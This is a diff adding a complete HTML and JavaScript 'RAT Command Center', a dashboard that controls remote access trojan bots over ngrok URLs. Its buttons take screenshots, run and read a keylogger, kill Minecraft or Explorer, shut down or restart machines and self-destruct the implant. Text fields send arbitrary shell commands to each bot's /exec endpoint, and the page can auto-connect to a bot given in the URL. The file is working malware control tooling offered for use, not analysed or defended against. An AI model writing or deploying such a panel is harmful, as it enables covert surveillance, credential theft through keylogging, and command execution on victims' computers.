@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RAT Dashboard</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Inter', sans-serif;
+    background: #0d1117;
+    color: #c9d1d9;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+    padding: 30px 20px;
+  }
+  .container { max-width: 850px; width: 100%; }
+  h1 { font-size: 2rem; font-weight: 700; margin-bottom: 20px; color: #58a6ff; border-bottom: 2px solid #30363d; padding-bottom: 10px; }
+  .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 20px; margin-bottom: 15px; }
+  .card h2 { font-size: 1.1rem; font-weight: 600; margin-bottom: 10px; color: #58a6ff; }
+  .input-group { display: flex; gap: 10px; margin-bottom: 10px; }
+  input[type="text"] {
+    background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 10px 12px;
+    color: #c9d1d9; font-family: inherit; font-size: 0.9rem; flex: 1;
+  }
+  input:focus { outline: none; border-color: #58a6ff; }
+  button {
+    background: #21262d; border: 1px solid #30363d; border-radius: 8px; color: #c9d1d9;
+    padding: 10px 16px; font-family: inherit; font-size: 0.9rem;
+    cursor: pointer; transition: all 0.2s; font-weight: 600; white-space: nowrap;
+  }
+  button:hover { background: #30363d; border-color: #58a6ff; color: white; }
+  button.primary { background: #238636; border-color: #2ea043; color: white; }
+  button.primary:hover { background: #2ea043; }
+  button.danger { background: #da3633; border-color: #f85149; color: white; }
+  button.danger:hover { background: #f85149; }
+  .bot-list { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 10px; }
+  .bot-chip {
+    background: #21262d; border: 2px solid #30363d; border-radius: 20px;
+    padding: 8px 16px; cursor: pointer; font-size: 0.85rem;
+    transition: all 0.2s; display: flex; align-items: center; gap: 6px;
+  }
+  .bot-chip.active { border-color: #58a6ff; background: #1f2937; color: white; }
+  .bot-chip .name { font-weight: 700; }
+  .bot-chip .url { color: #8b949e; font-size: 0.75rem; }
+  .bot-chip .delete-bot { margin-left: 6px; color: #f85149; cursor: pointer; font-weight: bold; font-size: 1rem; line-height: 1; }
+  .command-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 8px; }
+  .output-box {
+    background: #0d1117; border: 1px solid #30363d; border-radius: 8px;
+    padding: 12px; min-height: 120px; font-family: 'Courier New', monospace;
+    white-space: pre-wrap; font-size: 0.85rem; color: #79c0ff; margin-top: 10px;
+  }
+  .active-indicator { font-weight: 600; margin: 8px 0; font-size: 0.9rem; }
+  .active-indicator span { color: #58a6ff; }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>🕵️ RAT Command Center</h1>
+
+  <!-- Add Bot -->
+  <div class="card">
+    <h2>➕ Add New Bot</h2>
+    <div class="input-group">
+      <input type="text" id="botUrlInput" placeholder="Paste ngrok URL (e.g. http://0.tcp.ngrok.io:12345)">
+      <button class="primary" onclick="connectBot()">🔌 Connect</button>
+    </div>
+    <div id="connectStatus" style="font-size:0.8rem; color:#8b949e;"></div>
+  </div>
+
+  <!-- Bot List -->
+  <div class="card">
+    <h2>🤖 Your Bots</h2>
+    <div class="bot-list" id="botList"></div>
+    <div class="active-indicator">Active: <span id="activeName">None</span></div>
+  </div>
+
+  <!-- Commands -->
+  <div class="card">
+    <h2>⚡ Quick Actions</h2>
+    <div class="command-grid">
+      <button onclick="sendCommand('scr')">📸 Screenshot</button>
+      <button onclick="sendCommand('key')">📄 Keylog</button>
+      <button onclick="sendCommand('startlog')">▶️ Start Logger</button>
+      <button onclick="sendCommand('stoplog')">⏹️ Stop Logger</button>
+      <button onclick="sendCommand('crashm')">🔪 Kill Minecraft</button>
+      <button onclick="sendCommand('crashe')">💥 Kill Explorer</button>
+      <button onclick="sendCommand('status')">⏱ Uptime</button>
+      <button onclick="sendCommand('shut')">⏻ Shutdown</button>
+      <button onclick="sendCommand('res')">🔄 Restart</button>
+      <button class="danger" onclick="sendCommand('delete')">🧹 Self‑Destruct</button>
+    </div>
+    <div class="input-group" style="margin-top:12px;">
+      <input type="text" id="shellCmd" placeholder="whoami">
+      <button onclick="sendCommand('cmd ' + document.getElementById('shellCmd').value)">💻 Execute</button>
+    </div>
+    <div class="input-group">
+      <input type="text" id="manualCmd" placeholder="Type any command...">
+      <button onclick="sendCommand(document.getElementById('manualCmd').value)">🚀 Send</button>
+    </div>
+  </div>
+
+  <!-- Output -->
+  <div class="card">
+    <h2>📬 Output</h2>
+    <div class="output-box" id="output">Waiting for a command...</div>
+  </div>
+</div>
+
+<script>
+const STORAGE_KEY = 'friendlyBotList3';
+const SELECTED_KEY = 'selectedBotId3';
+
+function loadBots() { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}'); }
+function saveBots(bots) { localStorage.setItem(STORAGE_KEY, JSON.stringify(bots)); }
+function getSelected() { return localStorage.getItem(SELECTED_KEY) || ''; }
+function setSelected(label) {
+  localStorage.setItem(SELECTED_KEY, label);
+  renderBotList();
+}
+
+async function connectBot(url, botId = null) {
+  const status = document.getElementById('connectStatus');
+  status.textContent = 'Connecting...';
+  try {
+    const resp = await fetch(url.replace(/\/$/, '') + '/exec', {
+      method: 'POST',
+      headers: {'Content-Type': 'text/plain'},
+      body: 'id'
+    });
+    if (!resp.ok) throw new Error('HTTP ' + resp.status);
+    const id = (await resp.text()).trim() || botId;
+    if (!id) throw new Error('Could not detect ID');
+    const bots = loadBots();
+    bots[id] = { label: id, url: url };
+    saveBots(bots);
+    setSelected(id);
+    status.textContent = `✅ Connected! Bot ID: ${id}`;
+  } catch (e) {
+    status.textContent = `❌ Error: ${e.message}`;
+  }
+}
+
+function renderBotList() {
+  const bots = loadBots();
+  const selected = getSelected();
+  const container = document.getElementById('botList');
+  container.innerHTML = '';
+  if (Object.keys(bots).length === 0) {
+    container.innerHTML = '<span style="color:#8b949e;">No bots added. Use "Add New Bot".</span>';
+    document.getElementById('activeName').textContent = 'None';
+    return;
+  }
+  for (const [id, data] of Object.entries(bots)) {
+    const chip = document.createElement('div');
+    chip.className = 'bot-chip' + (id === selected ? ' active' : '');
+    chip.innerHTML = `<span class="name">${id}</span><span class="url">${data.url}</span><span class="delete-bot" title="Remove">✕</span>`;
+    chip.addEventListener('click', (e) => {
+      if (e.target.classList.contains('delete-bot')) {
+        e.stopPropagation();
+        deleteBot(id);
+        return;
+      }
+      setSelected(id);
+    });
+    container.appendChild(chip);
+  }
+  document.getElementById('activeName').textContent = bots[selected] ? selected : 'None';
+}
+
+function deleteBot(id) {
+  const bots = loadBots();
+  delete bots[id];
+  saveBots(bots);
+  if (getSelected() === id) setSelected('');
+  renderBotList();
+}
+
+async function sendCommand(cmd) {
+  const selected = getSelected();
+  if (!selected) { alert('Select a bot first!'); return; }
+  const bots = loadBots();
+  const bot = bots[selected];
+  if (!bot) return;
+  const url = bot.url.replace(/\/$/, '') + '/exec';
+  const output = document.getElementById('output');
+  output.textContent = `[${selected}] Sending: ${cmd}...`;
+  try {
+    const resp = await fetch(url, { method: 'POST', headers: {'Content-Type': 'text/plain'}, body: cmd });
+    const text = await resp.text();
+    output.textContent = `[${selected}] ${cmd}\n${text || '(no response)'}`;
+  } catch (e) {
+    output.textContent = `[${selected}] Error: ${e.message}`;
+  }
+}
+
+// ---- Auto-connect from URL parameters ----
+const params = new URLSearchParams(window.location.search);
+const autoBot = params.get('bot');
+const autoUrl = params.get('url');
+if (autoUrl) {
+  // If a bot ID is provided, we can try to connect directly
+  connectBot(autoUrl, autoBot).then(() => {
+    // Clear the URL parameters after connection (optional)
+    window.history.replaceState({}, document.title, window.location.pathname);
+  });
+}
+
+renderBotList();
+</script>
+</body>
+</html>
